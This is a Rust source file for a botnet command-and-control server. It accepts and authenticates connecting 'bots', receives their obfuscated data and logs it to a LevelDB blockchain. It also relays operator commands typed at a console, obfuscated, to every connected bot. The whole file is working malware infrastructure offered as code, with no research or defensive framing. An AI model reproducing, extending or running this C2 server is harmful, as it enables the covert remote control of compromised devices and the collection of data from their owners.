use tokio::{
    net,
    io::{AsyncReadExt, AsyncWriteExt, BufReader, Interest, ReadBuf},
    sync::{
        broadcast,
        broadcast::Receiver,
        broadcast::Sender,
        broadcast::error::TryRecvError
    },
};
use std::{
    io,
    thread,
    net::SocketAddr,
    str::from_utf8,
    error::Error,
    sync::{
        mpsc,
        Arc,
        Mutex
    }
};
use leveldb::{
    iterator::Iterable,
    options::ReadOptions,
    iterator::LevelDBIterator
};
use super::{
    lib,
    c2
};
use crate::{
    message as msg,
    blockchain::{
        block::{Block, BlockData, BlockHeader, Genesis, Hashing},
        blockchain::Blockchain,
        database,
    },
};

const HQ: &str = "127.0.0.1:6969";
const LOCAL: &str = "127.0.0.1:6000";
const MSG_SIZE: usize = 4096;
const USERNAME_LENGTH: usize = 10;
const IV_LEN: usize = 16;

async fn handle_message_received(DS: &mut c2::Device_stream, socket: &net::TcpStream) -> Vec<u8> {
    let mut buffer = [0; MSG_SIZE];
    loop {
        socket.readable().await;
        match socket.try_read(&mut buffer) {
            Ok(0) => {
                //println!("Client {} (username : {:?}) disconnected", DS.ip_address, from_utf8(&DS.M.Username).unwrap());
                DS.connected = false;
                return vec![];
            }
            Ok(recv_bytes) => {
                println!("Received message from {} (uid : {:?})", DS.ip_address, from_utf8(&DS.c2_id).unwrap());
            }
            Err(ref e) if e.kind() == io::ErrorKind::WouldBlock => {
                // edode : Avoid returning an empty vector (empty Incoming_Message)
                println!("Error: {}", e);
                //continue;
            }
            Err(e) => {
                println!("Error: {}", e);
            }
        };
        return buffer.to_vec();
    };
}

async fn authenticate_new_user(socket: &net::TcpStream, addr: SocketAddr) -> c2::Device_stream {
    let mut DS = c2::Device_stream::new(
        addr.to_string(),
        false,
        true,
        Vec::new(),
        c2::Bot::new(Vec::new(), Vec::new())
    );
    let data = handle_message_received(&mut DS, socket).await;
    if DS.connected {
        let encryption_key = msg::data_processing::deobfuscate_data(data, false, &DS.encryption_key);
        DS.authenticated = true;
        DS.B = msg::serialization::deserialize_rmp(encryption_key);
        DS.encryption_key = DS.B.com.data.clone();
    }
    return DS;
}

/// One function per bot
async fn handle_message_from_client(
    mut DS: c2::Device_stream,
    mut bot_tx: Sender<c2::Device_stream>,
    mut c2_rx: Receiver<Vec<u8>>,
    mut socket: net::TcpStream,
) -> io::Result<()> {

    let mut buffer: [u8; 4096] = [0; MSG_SIZE];
    let mut bf: [u8; 4096] = [0; MSG_SIZE];

    loop {
        match socket.try_read(&mut buffer) {
            Ok(n) if n == 0 => {
                //println!("Client {} (username : {:?}) disconnected", DS.ip_address, from_utf8(&DS.B.uid).unwrap());
                DS.connected = false;
            },
            Ok(recv_bytes) => { // edode : Deobfuscating data and sending it to the HQ
                let marshaled_data = msg::data_processing::deobfuscate_data(buffer.to_vec(), true, &DS.encryption_key);
                DS.B = msg::serialization::deserialize_rmp(marshaled_data);
                bot_tx.send(DS.clone()).unwrap();
                buffer
                    .iter_mut()
                    .for_each(|x| *x = 0); // reset buffer
            },
            Err(ref err) if err.kind() == io::ErrorKind::WouldBlock => {
                // edode : Avoid returning an empty vector (empty Incoming_Message)
                //println!("Error: {}", err);
                //continue; -> removing this allows to listen and to write commands
            },
            Err(err) => {
                println!("Error: {}", err);
            },
        };
        match c2_rx.try_recv() {
            Ok(command_sender) => {
                println!("Sending command to {:?}", command_sender);
                DS.B.com.data = command_sender;
                let obfuscated_data = msg::data_processing::obfuscate_data(msg::serialization::serialize_rmp(&DS.B), &DS.encryption_key);
                socket.write(obfuscated_data.as_slice()).await?;
            },
            _ => {}
        };
    }
    Ok(())
}

fn client_input (
    c2_tx: Sender<Vec<u8>>,
) -> io::Result<()> {
    loop {
        println!("-> ");
        let mut buff = String::new();
        io::stdin()
            .read_line(&mut buff)
            .expect("Did not entered a correct string");
        buff.pop();
        c2_tx.send(buff.into_bytes()).unwrap(); // edode : Data has to be sent to the bots
    }
    Ok(())
}

/// Receiving the data from the bot and sending it to the HQ
async fn receive_bot_data(
    mut bot_rx: Receiver<c2::Device_stream>,
    mut arc_Blkchain: Arc<Mutex<Blockchain>>,
    mut arc_Blk: Arc<Mutex<Block>>,
) -> io::Result<()> {
    loop {
        match bot_rx.try_recv() {
            Ok(mut received_data) => {
                //println!("Received data from channel : {:?} from : {:?}", received_data.B, received_data.ip_address);

                if let Ok(mut Blkchain) = arc_Blkchain.lock() {
                    if let Ok(mut Blk) = arc_Blk.lock() { // lisandro : clearable
                        let mut BH = Blk.header.clone();
                        let mut BD = Blk.data.clone();
                        BH.create_block_header(Blkchain.get_last_block_hash());
                        BD.create_block_data(received_data);
                        Blk.update_block(BH, BD);
                        Blkchain.add_block(Blk.clone());
                        //println!("Block added to the blockchain");
                    }
                    //println!("{:?}", Blkchain);
                }
            },
            Err(err) => {
                // edode : empty channel
                //println!("Could not receive data : {}", err);
            },
            _ => {}
        };
    }
    Ok(())
}

fn recover_database() -> (Blockchain, Block) {
    // edode : determining if there is data inside the database
    let mut data: bool = false;
    for db_data in database::D.iter(ReadOptions::new()) {
        data = true;
        break
    }
    return if data { // edode : Recovering the blockchain from the database
        let (last_block_id, last_block_data) = database::D.iter(ReadOptions::new()).last().unwrap();
        let Blk: Block = Hashing::deserialize_block(last_block_data.clone().as_slice());
        let Blkchain: Blockchain = Blockchain::new(Blk.clone());
        (Blkchain, Blk)
    } else { // edode : Creating a new blockchain
        let mut Blk: Block = Block::genesis_block();
        let mut Blkchain: Blockchain = Blockchain::new(Blk.clone());
        (Blkchain, Blk)
    }
}

#[tokio::main]
pub async fn main() -> Result<(), Box<dyn Error>> {

    let listener = net::TcpListener::bind(LOCAL).await?;
    let (chn_bot_tx, mut _chn_bot_rcv) = broadcast::channel(64);
    let (chn_c2_tx, mut _chn_c2_rx) = broadcast::channel(64);

    let c2_input_rx = chn_c2_tx.clone();
    thread::spawn(move || {
        client_input(c2_input_rx);
    });

    let mut Co: c2::Cohort = c2::Cohort::new();
    let (mut Blkchain, mut Blk) = recover_database();

    let Blkchain_arc = Arc::new(Mutex::new(Blkchain));
    let Blk_arc = Arc::new(Mutex::new(Blk));

    let mut bot_rx = chn_bot_tx.subscribe();
    tokio::spawn(async move {
        receive_bot_data(bot_rx, Blkchain_arc, Blk_arc).await;
    });

    println!("C2 Server Initialized");
    loop {
        // edode : Accepting the new bot
        let (socket, addr) = listener.accept().await?;

        println!("New user connected: {}", addr);

        Co.append_C2_Stream(authenticate_new_user(&socket, addr).await);
        if !Co.C2_Stream.last().unwrap().connected {
            drop(Co.C2_Stream.pop());
            continue;
        }

        let mut co_clone = Co.C2_Stream.last().unwrap().clone();

        let bot_tx = chn_bot_tx.clone();

        let mut c2_rx = chn_c2_tx.subscribe();
        let c2_tx = chn_c2_tx.clone();

        tokio::spawn(async move {
            handle_message_from_client(co_clone, bot_tx, c2_rx, socket).await;
        });
    }
    Ok(())
}
